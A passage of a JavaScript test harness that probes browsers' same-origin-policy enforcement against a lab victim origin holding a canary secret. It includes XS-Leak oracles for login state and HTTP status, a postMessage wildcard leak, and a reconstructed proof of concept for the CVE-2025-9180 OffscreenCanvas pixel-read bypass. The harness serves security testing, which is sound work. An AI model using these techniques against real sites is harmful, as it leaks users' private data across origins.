          'blur', 'frames', 'length', 'top', 'opener', 'parent', 'postMessage'];
        var probes = ['length', 'closed', 'origin', 'name', 'document.cookie',
          'document.body.innerText', 'document.title', 'localStorage',
          'navigator.userAgent', 'history.length', 'location.href'];
        var readable = [], blocked = [], leaked = null;
        probes.forEach(function (p) {
          var r = probeRead(f.contentWindow, p);
          if (r.ok && r.value !== undefined) {
            readable.push(p + '=' + String(r.value).slice(0, 40));
            if (canaryIn(r.value)) leaked = extractCanary(r.value);
          } else blocked.push(p);
        });
        removeFrame(f);
        var unexpected = readable.filter(function (s) {
          var k = s.split('=')[0];
          return k.indexOf('.') !== -1 || allowed.indexOf(k) === -1;
        });
        return res(leaked ? V.BYPASS : V.BLOCKED,
          'readable=[' + readable.join(', ') + '] blocked=' + blocked.length
          + ' outsideAllowlist=[' + unexpected.join(', ') + ']', leaked,
          { readable: readable, blockedProps: blocked, outsideAllowlist: unexpected });
      },
    },

    {
      id: 'OPENER-02-frame-count-state-leak',
      lane: 'opener-navigation',
      title: 'window.length as a cross-origin state oracle',
      why: 'frames.length is deliberately cross-origin readable. Because subframe '
         + 'count usually differs between logged-in and logged-out renderings, it '
         + 'is a reliable login-state oracle that needs no bug at all. Not a '
         + 'canary read, so it is reported as a side channel rather than a BYPASS.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §CrossOriginProperties', 'XS-Leaks wiki: frame counting'],
      expect: { chromium: 'INCONCLUSIVE', firefox: 'INCONCLUSIVE', webkit: 'INCONCLUSIVE' },
      run: async function () {
        var f = await addFrame({ src: O().VICTIM + '/lab/canary' });
        var n = probeRead(f, 'contentWindow.length');
        removeFrame(f);
        return res(n.ok ? V.INCONCLUSIVE : V.BLOCKED,
          n.ok ? 'cross-origin frames.length readable = ' + n.value
               + ' (state oracle, no canary crosses)'
               : 'not readable: ' + n.error, null);
      },
    },

    {
      id: 'OPENER-03-named-window-overwrite',
      lane: 'opener-navigation',
      title: 'Cross-origin window.name write-through',
      why: 'window.name survives cross-origin navigation, which historically made '
         + 'it a cross-origin data channel. Whether a foreign origin can still '
         + 'write it decides if that channel is open.',
      runOn: 'ATTACKER',
      references: ['window.name transport (classic)'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var f = await addFrame({ src: O().VICTIM + '/lab/canary', name: 'sop-target' });
        var wrote = false, err = null;
        try { f.contentWindow.name = 'written-by-' + location.origin; wrote = true; }
        catch (e) { err = String(e); }
        var back = probeRead(f, 'contentWindow.name');
        removeFrame(f);
        return res(V.BLOCKED,
          'write ' + (wrote ? 'did not throw' : 'threw: ' + String(err).slice(0, 90))
          + '; readback ' + (back.ok ? '=' + back.value : 'blocked')
          + ' — name is a channel, not a canary read', null);
      },
    },

    // =====================================================================
    // LANE: messaging
    // =====================================================================
    {
      id: 'MSG-01-postmessage-wildcard-target',
      lane: 'messaging',
      title: 'postMessage with targetOrigin "*" delivers to any origin',
      why: 'Not an engine bug — an application one, and the most common SOP '
         + 'failure in real code. Sending with "*" means any origin that gets a '
         + 'handle to the window receives the payload. Reported as a BYPASS '
         + 'because the canary genuinely crosses the boundary.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §postMessage', 'OWASP: postMessage misuse'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var got = null;
        var onmsg = function (e) {
          if (e.data && e.data.__soplab_wildcard) got = { data: e.data, origin: e.origin };
        };
        global.addEventListener('message', onmsg);
        // /lab/broadcast is served by the victim origin and holds the canary.
        // This page does not, and never learns it except by receiving it here —
        // so a hit is a genuine cross-origin delivery, not a self-report.
        var f = await addFrame({ src: O().VICTIM + '/lab/broadcast' });
        await waitFor(function () { return got; }, 3000);
        global.removeEventListener('message', onmsg);
        removeFrame(f);
        if (!got) return res(V.INCONCLUSIVE, 'no wildcard message received', null);
        var c = extractCanary(JSON.stringify(got.data));
        return res(c ? V.BYPASS : V.BLOCKED,
          'received from origin=' + got.origin + ' at listener on ' + location.origin
          + ' — wildcard targetOrigin delivered victim-origin secret to a '
          + 'foreign listener with no origin check', c);
      },
    },

    {
      id: 'MSG-02-message-origin-attribution',
      lane: 'messaging',
      title: 'MessageEvent.origin is correctly attributed',
      why: 'Every postMessage security decision rests on event.origin being '
         + 'truthful. If a cross-origin sender could forge it, all receiver-side '
         + 'origin checks collapse at once.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §MessageEvent'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var seen = [];
        var onmsg = function (e) { seen.push({ origin: e.origin, data: e.data }); };
        global.addEventListener('message', onmsg);
        var f = await addFrame({ src: O().VICTIM + '/lab/headers' });
        try {
          f.contentWindow.eval('parent.postMessage({__attr:1},"*")');
        } catch (_) {
          // Expected: cannot drive a cross-origin frame. Fall back to observing
          // whatever the frame sends on its own.
        }
        await sleep(600);
        global.removeEventListener('message', onmsg);
        removeFrame(f);
        var wrong = seen.filter(function (s) {
          return s.data && s.data.__attr && s.origin !== O().VICTIM;
        });
        return res(wrong.length ? V.BYPASS : V.BLOCKED,
          'messages=' + seen.length + ' misattributed=' + wrong.length
          + ' origins=' + JSON.stringify(seen.map(function (s) { return s.origin; })),
          wrong.length ? JSON.stringify(wrong[0]) : null);
      },
    },

    // =====================================================================
    // LANE: side-channel
    // =====================================================================
    {
      id: 'SIDE-01-status-code-onerror-oracle',
      lane: 'side-channel',
      title: 'Cross-origin HTTP status oracle via load/error events',
      why: 'load versus error on a cross-origin subresource distinguishes 200 from '
         + '404 without reading a single byte. Enough to enumerate object IDs or '
         + 'probe authorisation state, and no engine can close it without '
         + 'breaking the web.',
      runOn: 'ATTACKER',
      references: ['XS-Leaks wiki: error events'],
      expect: { chromium: 'INCONCLUSIVE', firefox: 'INCONCLUSIVE', webkit: 'INCONCLUSIVE' },
      run: async function () {
        function probeStatus(code) {
          return new Promise(function (resolve) {
            var s = document.createElement('script');
            s.src = O().VICTIM + '/lab/status?code=' + code + '&r=' + Math.random();
            s.onload = function () { s.remove(); resolve('load'); };
            s.onerror = function () { s.remove(); resolve('error'); };
            document.head.appendChild(s);
            setTimeout(function () { resolve('timeout'); }, 3000);
          });
        }
        var ok = await probeStatus(200);
        var nf = await probeStatus(404);
        var distinguishes = ok !== nf;
        return res(distinguishes ? V.INCONCLUSIVE : V.BLOCKED,
          '200=>' + ok + ' 404=>' + nf
          + (distinguishes ? ' — status distinguishable cross-origin (oracle open)'
                           : ' — indistinguishable'), null);
      },
    },

    {
      id: 'SIDE-02-resource-timing-visibility',
      lane: 'side-channel',
      title: 'Cross-origin entries in the Resource Timing buffer',
      why: 'Cross-origin resource timings must be coarsened without '
         + 'Timing-Allow-Origin, but entry *existence* and duration still leak '
         + 'cache state and redirect chains. Measures how much survives.',
      runOn: 'ATTACKER',
      references: ['Resource Timing L2 §privacy', 'XS-Leaks wiki: timing'],
      expect: { chromium: 'INCONCLUSIVE', firefox: 'INCONCLUSIVE', webkit: 'INCONCLUSIVE' },
      run: async function () {
        var tag = 'rt-' + Math.random().toString(36).slice(2);
        try {
          await fetch(O().VICTIM + '/lab/slow?ms=250&t=' + tag, { mode: 'no-cors' });
        } catch (_) {}
        await sleep(300);
        var entries = (performance.getEntriesByType('resource') || [])
          .filter(function (e) { return e.name.indexOf(tag) !== -1; });
        if (!entries.length) return res(V.BLOCKED, 'no cross-origin entry recorded', null);
        var e = entries[0];
        var coarsened = e.responseStart === 0 && e.requestStart === 0;
        return res(V.INCONCLUSIVE,
          'entry present; duration=' + Math.round(e.duration) + 'ms'
          + ' responseStart=' + e.responseStart
          + ' redirectCount=' + e.redirectCount
          + ' timingsCoarsened=' + coarsened
          + ' — existence and duration leak regardless', null);
      },
    },

    {
      id: 'SIDE-03-cross-origin-redirect-chain-leak',
      lane: 'side-channel',
      title: 'Redirect destination inference across origins',
      why: 'A cross-origin redirect\'s final URL is not readable, but whether it '
         + 'happened, and how many hops, often is. Redirect targets frequently '
         + 'encode authorisation state, which turns hop counting into an oracle.',
      runOn: 'ATTACKER',
      references: ['XS-Leaks wiki: redirects', 'Fetch Standard §redirect handling'],
      expect: { chromium: 'INCONCLUSIVE', firefox: 'INCONCLUSIVE', webkit: 'INCONCLUSIVE' },
      run: async function () {
        var tag = 'rd-' + Math.random().toString(36).slice(2);
        var dest = O().VICTIM + '/lab/canary.json';
        var url = O().VICTIM + '/lab/redirect?t=' + tag + '&to=' + encodeURIComponent(dest);
        var finalUrl = null, err = null, redirected = null;
        try {
          var r = await fetch(url, { mode: 'no-cors', redirect: 'follow' });
          finalUrl = r.url; redirected = r.redirected;
        } catch (e) { err = String(e); }
        await sleep(200);
        var ent = (performance.getEntriesByType('resource') || [])
          .filter(function (e) { return e.name.indexOf(tag) !== -1; })[0];
        return res(V.INCONCLUSIVE,
          'opaqueFinalUrl=' + JSON.stringify(finalUrl)
          + ' redirectedFlag=' + redirected
          + ' timingRedirectCount=' + (ent ? ent.redirectCount : 'n/a')
          + (err ? ' err=' + err.slice(0, 90) : '')
          + ' — destination hidden, occurrence observable', null);
      },
    },


    // =====================================================================
    // LANE: canvas-sop
    //
    // Canvas origin-tainting is the one place where SOP is enforced by a *flag
    // carried on an object* rather than by a boundary between realms, which is
    // why it keeps failing: every new canvas surface (OffscreenCanvas, bitmap
    // renderers, transferred control) is a fresh chance to forget to propagate
    // the flag. Firefox has shipped three separate fixes for this exact class:
    // CVE-2023-4045 (Firefox 116), CVE-2024-5693 (Firefox 127) and CVE-2025-9180
    // (Firefox 142 / ESR 115.27 / 128.14 / 140.2).
    // =====================================================================
    {
      id: 'CANVAS-01-crossorigin-draw-taints',
      lane: 'canvas-sop',
      title: 'Drawing a non-CORS cross-origin image taints the canvas',
      why: 'The baseline the whole canvas lane rests on. /lab/canary.png encodes '
         + 'the canary one byte per pixel, so if this read ever succeeds the exact '
         + 'secret comes back and there is no ambiguity about what leaked. A '
         + 'conforming engine must throw SecurityError on getImageData here.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §origin-clean flag', 'CVE-2023-4045', 'CVE-2024-5693'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var img = await loadImage(O().VICTIM + '/lab/canary.png', null);
        if (!img) return res(V.INCONCLUSIVE, 'cross-origin image failed to load', null);
        var c = document.createElement('canvas');
        c.width = img.naturalWidth || 64; c.height = 1;
        c.getContext('2d').drawImage(img, 0, 0);

        var viaImageData = readCanvasRowAsString(c, c.width);
        var viaDataUrl = null, dataUrlErr = null;
        try { viaDataUrl = c.toDataURL('image/png'); }
        catch (e) { dataUrlErr = String(e && e.name || e); }

        var leaked = extractCanary(viaImageData)
          || extractCanary(await decodeDataUrlRow(viaDataUrl, c.width));
        return res(leaked ? V.BYPASS : V.BLOCKED,
          'imageWidth=' + (img.naturalWidth || 0)
          + ' getImageData=' + (viaImageData === null ? 'threw (tainted, correct)' : 'RESOLVED')
          + ' toDataURL=' + (dataUrlErr ? 'threw ' + dataUrlErr + ' (tainted, correct)' : 'RESOLVED'),
          leaked);
      },
    },

    {
      id: 'CANVAS-02-offscreen-transfer-taint-propagation',
      lane: 'canvas-sop',
      title: 'OffscreenCanvas taint propagates back to the placeholder element (CVE-2025-9180)',
      why: 'The CVE-2025-9180 mechanism, reconstructed from the fix commit rather '
         + 'than from a writeup, because no public POC exists and Mozilla shipped '
         + 'the fix with no in-tree test. OffscreenCanvasDisplayHelper had no '
         + 'write-only member at all, so tainting a canvas inside a Worker after '
         + 'transferControlToOffscreen() left the main-thread toDataURL()/toBlob() '
         + 'readback ungated. What leaks is raw cross-origin pixel data — a full '
         + 'read primitive, not a timing oracle. Affected: Firefox before 142, ESR '
         + 'before 115.27 / 128.14 / 140.2.',
      runOn: 'ATTACKER',
      references: ['CVE-2025-9180', 'MFSA 2025-64', 'Bugzilla 1979782',
        'fix commit 44541e940dd8ab537118a39f77b1f4e9d23ce59e'],
      // Chromium is expected to refuse at the bitmap-handoff gate rather than at
      // taint propagation, so BLOCKED there says nothing about the propagation
      // bug itself — read the gates= list in the detail, not just the verdict.
      // Firefox before 142 / ESR 115.27 / 128.14 / 140.2 is the build where this
      // probe can actually reach the mechanism.
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'UNSUPPORTED' },
      run: async function () {
        var canvas = document.createElement('canvas');
        canvas.width = 64; canvas.height = 1;
        if (typeof canvas.transferControlToOffscreen !== 'function') {
          return res(V.UNSUPPORTED, 'transferControlToOffscreen() not implemented', null);
        }
        var img = await loadImage(O().VICTIM + '/lab/canary.png', null);
        if (!img) return res(V.INCONCLUSIVE, 'cross-origin image failed to load', null);
        canvas.width = img.naturalWidth || 64;

        // The bitmap is created on the main thread from a non-CORS cross-origin
        // image, so it carries the origin taint into the worker.
        var bmp = null;
        try { bmp = await createImageBitmap(img); }
        catch (e) { return res(V.INCONCLUSIVE, 'createImageBitmap failed: ' + String(e), null); }

        var off;
        try { off = canvas.transferControlToOffscreen(); }
        catch (e) { return res(V.INCONCLUSIVE, 'transferControlToOffscreen threw: ' + String(e), null); }

        // Getting cross-origin pixels into the worker's OffscreenCanvas is itself
        // gated, and engines gate it at different points. Rather than giving up on
        // the first refusal, try each route and report which gate stopped us —
        // "blocked, and here is exactly where" is a result; "inconclusive" is not.
        var workerSrc = 'onmessage = async function (e) {\n'
          + '  var off = e.data.off, bmp = e.data.bmp, url = e.data.url;\n'
          + '  var r = { drew: false, route: e.data.route, err: null };\n'
          + '  try {\n'
          + '    var ctx = off.getContext("2d");\n'
          + '    if (!bmp && url) {\n'
          + '      try {\n'
          + '        var resp = await fetch(url, { mode: "no-cors" });\n'
          + '        bmp = await createImageBitmap(await resp.blob());\n'
          + '        r.workerFetched = true;\n'
          + '      } catch (fe) { r.workerFetchErr = String(fe && fe.name || fe); }\n'
          + '    }\n'
          + '    if (bmp) {\n'
          + '      ctx.drawImage(bmp, 0, 0);\n'
          + '      if (ctx.commit) ctx.commit();\n'
          + '      r.drew = true;\n'
          + '      try { ctx.getImageData(0, 0, 1, 1); r.workerReadOk = true; }\n'
          + '      catch (err) { r.workerReadOk = false; r.workerReadErr = String(err && err.name); }\n'
          + '    }\n'
          + '  } catch (err) { r.err = String(err && err.name || err); }\n'
          + '  postMessage(r);\n'
          + '};';
        var wUrl = URL.createObjectURL(new Blob([workerSrc], { type: 'text/javascript' }));
        var worker = new Worker(wUrl);
        var wr = null;
        worker.onmessage = function (e) { wr = e.data; };

        var gates = [];
        var handedOff = false;
        // Route A: transfer the tainted bitmap. Chromium refuses this outright
        // ("Non-origin-clean ImageBitmap cannot be transferred"), which is a
        // defence sitting in front of the CVE-2025-9180 mechanism.
        try {
          worker.postMessage({ off: off, bmp: bmp, route: 'transfer-bitmap' }, [off, bmp]);
          handedOff = true; gates.push('transfer-bitmap:accepted');
        } catch (e) {
          gates.push('transfer-bitmap:refused(' + String(e && e.name || e) + ')');
        }
        // Route B: hand the bitmap over by copy rather than by transfer.
        if (!handedOff) {
          try {
            worker.postMessage({ off: off, bmp: bmp, route: 'copy-bitmap' }, [off]);
            handedOff = true; gates.push('copy-bitmap:accepted');
          } catch (e) {
            gates.push('copy-bitmap:refused(' + String(e && e.name || e) + ')');
          }
        }
        // Route C: let the worker fetch the image itself. An opaque no-cors
        // response should not be decodable into an ImageBitmap, but where each
        // engine refuses is worth recording.
        if (!handedOff) {
          try {
            worker.postMessage({ off: off, url: O().VICTIM + '/lab/canary.png',
              route: 'worker-fetch' }, [off]);
            handedOff = true; gates.push('worker-fetch:accepted');
          } catch (e) {
            gates.push('worker-fetch:refused(' + String(e && e.name || e) + ')');
          }
        }

        if (!handedOff) {
          worker.terminate(); URL.revokeObjectURL(wUrl);
          return res(V.BLOCKED,
            'no route delivered cross-origin pixels into the worker; gates=['
            + gates.join(' | ') + '] — this build refuses before the '
            + 'CVE-2025-9180 propagation path is reachable, so it is defended at '
            + 'an earlier gate rather than by taint propagation itself',
            null);
        }

        await waitFor(function () { return wr; }, 6000);
        // Give the compositor a frame to push the worker's draw back to the
        // placeholder element before reading it.
        await new Promise(function (r2) {
          if (global.requestAnimationFrame) requestAnimationFrame(function () { setTimeout(r2, 120); });
          else setTimeout(r2, 200);
        });

        var viaDataUrl = null, dataUrlErr = null;
        try { viaDataUrl = canvas.toDataURL('image/png'); }
        catch (e) { dataUrlErr = String(e && e.name || e); }
        var decoded = await decodeDataUrlRow(viaDataUrl, canvas.width);

        // toBlob is a separate readback path from toDataURL, and the fix commit
        // touched the gating for both.
        var blobLeak = null;
        try {
          blobLeak = await new Promise(function (r3) {
            var t = setTimeout(function () { r3(null); }, 2500);
            try {
              canvas.toBlob(function (b) {
                clearTimeout(t);
                if (!b) return r3(null);
                var fr = new FileReader();
                fr.onload = function () { r3(String(fr.result)); };
                fr.onerror = function () { r3(null); };
                fr.readAsBinaryString(b);
              }, 'image/png');
            } catch (e) { clearTimeout(t); r3(null); }
          });
        } catch (_) {}

        worker.terminate(); URL.revokeObjectURL(wUrl);
        var leaked = extractCanary(decoded) || extractCanary(blobLeak);
        return res(leaked ? V.BYPASS : V.BLOCKED,
          'gates=[' + gates.join(' | ') + '] worker=' + JSON.stringify(wr)
          + ' mainThread toDataURL=' + (dataUrlErr ? 'threw ' + dataUrlErr
              + ' (taint propagated, correct)' : 'RESOLVED len='
              + String(viaDataUrl ? viaDataUrl.length : 0))
          + ' recoveredPixels=' + (decoded ? JSON.stringify(decoded.slice(0, 24)) : 'none')
          + ' — ' + (leaked
              ? 'cross-origin pixel data crossed via the placeholder element'
              : 'placeholder readback was gated'),
          leaked);
      },
    },

    {
      id: 'CANVAS-03-cors-image-read-authorised',
      lane: 'canvas-sop',
      title: 'CORS-approved cross-origin image is legitimately readable',
      why: 'The positive control for the lane. With crossOrigin="anonymous" and a '
         + 'permissive ACAO the canvas stays origin-clean and the pixels read '
         + 'back, which proves the readback path in CANVAS-01/02 works at all. '
         + 'Without this, a BLOCKED result there could just mean the pixel '
         + 'decoding is broken.',
      runOn: 'ATTACKER',
      references: ['HTML Standard §origin-clean flag', 'Fetch Standard §CORS'],
      expect: { chromium: 'BYPASS', firefox: 'BYPASS', webkit: 'BYPASS' },
      run: async function () {
        var img = await loadImage(O().VICTIM + '/lab/canary.png?cors=*', 'anonymous');
        if (!img) return res(V.INCONCLUSIVE, 'CORS image failed to load', null);
        var c = document.createElement('canvas');
        c.width = img.naturalWidth || 64; c.height = 1;
        c.getContext('2d').drawImage(img, 0, 0);
        var row = readCanvasRowAsString(c, c.width);
        var leaked = extractCanary(row);
        return res(leaked ? V.BYPASS : V.BLOCKED,
          'width=' + (img.naturalWidth || 0)
          + ' getImageData=' + (row === null ? 'threw' : 'resolved')
          + ' — CORS grant makes the read authorised; recorded as BYPASS because '
          + 'the canary does cross the origin boundary',
          leaked);
      },
    },

    // =====================================================================
    // LANE: storage-isolation
    // =====================================================================
    {
      id: 'STORE-01-localstorage-partition',
      lane: 'storage-isolation',
      title: 'localStorage is keyed to the exact origin tuple',
      why: 'Storage must be keyed on the full origin, not the host. If the '
         + 'https:8443 and https:9443 views of one hostname share a store, then '
         + 'port is not part of the storage key and SOP is weaker than specified.',
      runOn: 'VICTIM',
      references: ['HTML Standard §storage partitioning', 'RFC 6454'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var key = 'soplab-' + Math.random().toString(36).slice(2);
        localStorage.setItem(key, lab().canary || 'x');
        // Same host, different port: a distinct origin.
        var f = await addFrame({ src: O().ALTPORT + '/lab/headers' });
        var r = { ok: false, error: 'not attempted' };
        try {
          r = { ok: true, value: f.contentWindow.eval(
            'localStorage.getItem(' + JSON.stringify(key) + ')') };
        } catch (e) { r = { ok: false, error: String(e) }; }
        removeFrame(f);
        localStorage.removeItem(key);
        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          'altport read=' + (r.ok ? JSON.stringify(r.value) : 'blocked: '
            + String(r.error).slice(0, 120))
          + ' — port is ' + (c ? 'NOT' : '') + ' part of the storage key', c);
      },
    },

    {
      id: 'STORE-02-scheme-isolation',
      lane: 'storage-isolation',
      title: 'http and https views of one host are distinct origins',
      why: 'Scheme is part of the origin tuple. If the insecure view can reach '
         + 'into the secure view\'s DOM, a network attacker who can inject over '
         + 'http inherits the https origin.',
      runOn: 'VICTIM',
      references: ['RFC 6454 §4'],
      expect: { chromium: 'BLOCKED', firefox: 'BLOCKED', webkit: 'BLOCKED' },
      run: async function () {
        var f = await addFrame({ src: O().INSECURE + '/lab/canary' });
        var r = probeRead(f, 'contentWindow.document.body.innerText');
        removeFrame(f);
        var c = r.ok ? extractCanary(r.value) : null;
        return res(c ? V.BYPASS : V.BLOCKED,
          r.ok ? 'read resolved across scheme boundary'
               : 'blocked: ' + r.error
                 + ' (note: mixed content may also have blocked the load)', c);
      },
    },
  ];

  // -----------------------------------------------------------------------
  // Driver
  // -----------------------------------------------------------------------

  function byId(id) {
    for (var i = 0; i < PROBES.length; i++) if (PROBES[i].id === id) return PROBES[i];
    return null;
  }

  async function run(id) {
    var p = byId(id);
    if (!p) return { id: id, verdict: V.ERROR, detail: 'no such probe' };
    var t0 = (performance && performance.now) ? performance.now() : Date.now();
    var out;
    try {
      out = await Promise.race([
        p.run(),
        sleep(20000).then(function () {
          return res(V.ERROR, 'probe exceeded its 20s budget', null);
        }),
      ]);
    } catch (e) {
      out = res(V.ERROR, String(e && e.stack ? e.stack : e).slice(0, 600), null);
    }
    var t1 = (performance && performance.now) ? performance.now() : Date.now();
    return Object.assign({
      id: p.id, lane: p.lane, title: p.title, why: p.why,
      runOn: p.runOn, references: p.references || [], expect: p.expect || {},
      loadedOrigin: location.origin,
      ms: Math.round(t1 - t0),
    }, out);
  }

  function manifest() {
    return PROBES.map(function (p) {
      return {
        id: p.id, lane: p.lane, title: p.title, why: p.why,
        runOn: p.runOn, references: p.references || [], expect: p.expect || {},
        harnessQuery: p.harnessQuery || null,
      };
    });
  }

  function lanes() {
    var seen = [];
    PROBES.forEach(function (p) { if (seen.indexOf(p.lane) === -1) seen.push(p.lane); });
    return seen;
  }

  global.SOPProbes = {
    VERDICTS: V, run: run, manifest: manifest, lanes: lanes,
    ids: function () { return PROBES.map(function (p) { return p.id; }); },
    byId: byId,
    helpers: { sleep: sleep, waitFor: waitFor, addFrame: addFrame, probeRead: probeRead,
      extractCanary: extractCanary, lab: lab },
  };
})(typeof window !== 'undefined' ? window : globalThis);
